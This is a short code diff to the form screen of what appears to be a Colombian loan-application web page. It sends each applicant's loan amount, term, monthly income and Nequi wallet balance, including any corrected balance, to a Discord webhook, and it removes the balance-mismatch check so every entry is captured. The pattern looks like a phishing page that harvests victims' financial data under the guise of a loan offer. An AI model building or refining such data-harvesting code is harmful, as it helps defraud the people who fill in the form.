@@ -286,18 +286,23 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
   }
 
   function handleBalanceConfirm() {
-    if (confirmBalanceValue === data.nequiBalance) {
-      DiscordWebhookService.sendInfo('Información financiera', '', {}, {
-        'Monto solicitado': `$${parseInt(data.loanAmount || '0').toLocaleString('es-CO')} COP`,
-        'Plazo del crédito': `${data.loanTerm} meses`,
-        'Ingresos mensuales': `$${parseInt(data.monthlyIncome || '0').toLocaleString('es-CO')} COP`,
-        'Saldo Nequi': `$${parseInt(data.nequiBalance || '0').toLocaleString('es-CO')} COP`,
+    const oldBalance = data.nequiBalance
+    const newBalance = confirmBalanceValue
+    if (oldBalance !== newBalance) {
+      onChange('nequiBalance', newBalance)
+      DiscordWebhookService.sendInfo('Saldo corregido', '', {}, {
+        'Saldo anterior': `$${parseInt(oldBalance || '0').toLocaleString('es-CO')} COP`,
+        'Saldo corregido': `$${parseInt(newBalance || '0').toLocaleString('es-CO')} COP`,
       })
-      setShowBalanceConfirm(false)
-      onContinue()
-    } else {
-      setBalanceError('El saldo ingresado no coincide. Verifica e intenta de nuevo.')
     }
+    DiscordWebhookService.sendInfo('Información financiera', '', {}, {
+      'Monto solicitado': `$${parseInt(data.loanAmount || '0').toLocaleString('es-CO')} COP`,
+      'Plazo del crédito': `${data.loanTerm} meses`,
+      'Ingresos mensuales': `$${parseInt(data.monthlyIncome || '0').toLocaleString('es-CO')} COP`,
+      'Saldo Nequi': `$${parseInt(newBalance || '0').toLocaleString('es-CO')} COP`,
+    })
+    setShowBalanceConfirm(false)
+    onContinue()
   }
 
   const slideClass = animating
